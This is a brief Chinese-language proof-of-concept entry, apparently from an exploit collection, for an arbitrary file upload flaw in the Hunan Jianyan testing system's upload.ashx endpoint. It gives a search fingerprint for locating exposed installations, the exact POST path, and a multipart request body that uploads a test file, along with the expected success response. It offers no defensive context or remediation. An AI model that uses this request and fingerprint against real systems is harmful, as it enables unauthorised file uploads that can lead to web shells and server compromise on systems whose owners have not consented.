# 湖南建研检测系统upload.ashx任意文件上传漏洞

- **系统**：湖南建研检测系统upload.ashx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Applications/Attachment/upload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=------------------------OqjxWF…`

**请求体 / payload**
```
--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
Content-Disposition: form-data; name="file";filename="dudesite.txt"
123
--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
Content-Disposition: form-data; name="_upload_guid"
1
--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
```
- **预期**：200　|　dudesite.txt